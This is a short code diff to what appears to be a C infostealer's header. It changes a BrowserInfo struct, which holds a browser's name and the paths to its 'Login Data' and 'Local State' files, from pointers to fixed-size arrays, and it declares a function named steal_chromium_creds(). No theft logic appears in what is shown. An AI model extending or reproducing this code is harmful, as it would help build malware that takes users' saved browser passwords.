@@ -6,10 +6,17 @@
 
 #include "logins.h"
 
+#define MAX_BROWSER_NAME_SIZE 20
+#define MAX_LOGIN_DATA_PATH_SIZE 57
+#define MAX_LOCAL_STATE_PATH_SIZE 50
+
 typedef struct {
-  PWSTR browserName;
-  PWSTR loginDataPath;
-  PWSTR localStatePath;
+  //PWSTR browserName;
+  //PWSTR loginDataPath;
+  //PWSTR localStatePath;
+  WCHAR browserName[MAX_BROWSER_NAME_SIZE];
+  WCHAR loginDataPath[MAX_LOGIN_DATA_PATH_SIZE];
+  WCHAR localStatePath[MAX_LOCAL_STATE_PATH_SIZE];
 } BrowserInfo;
 
 int steal_chromium_creds();
